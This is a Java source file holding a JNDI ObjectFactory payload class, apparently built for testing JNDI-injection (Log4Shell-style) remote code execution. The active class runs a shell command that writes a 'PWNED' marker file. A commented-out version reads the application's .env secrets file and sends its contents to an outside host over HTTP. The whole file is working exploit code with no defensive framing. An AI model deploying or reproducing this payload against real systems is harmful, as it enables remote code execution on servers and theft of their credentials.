import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Hashtable;

public  class Fabien implements  ObjectFactory  {
    @Override
    public Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws Exception {
        String[] cmd = {
            "/bin/sh",
            "-c",
            "echo PWNED > /tmp/fabienlapute"
        };

        URL url = new URL("http://example.com");
        HttpURLConnection con = (HttpURLConnection) url.openConnection();
        con.setRequestMethod("POST");

        Runtime.getRuntime().exec(cmd);
        return  null;
    }
}

/*
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Hashtable;
import java.lang.Process;
import java.util.stream.Collectors;

public  class Fabien implements  ObjectFactory  {
    @Override
    public Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws Exception {
        String[] cmd = {
            "/bin/sh",
            "-c",
            "cat", ".env" ,"|","tee","-a", "/tmp/toto"
        };

        Process p = Runtime.getRuntime().exec(cmd);
        p.waitFor();

        BufferedReader stream = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String stdout = stream.lines().collect(Collectors.joining("\n"));


        URL url = new URL("http://172.22.0.3:3000/log?msg=" + stdout);
        HttpURLConnection con = (HttpURLConnection) url.openConnection();
        con.setRequestMethod("GET");
    

        return  null;
    }
}
*/
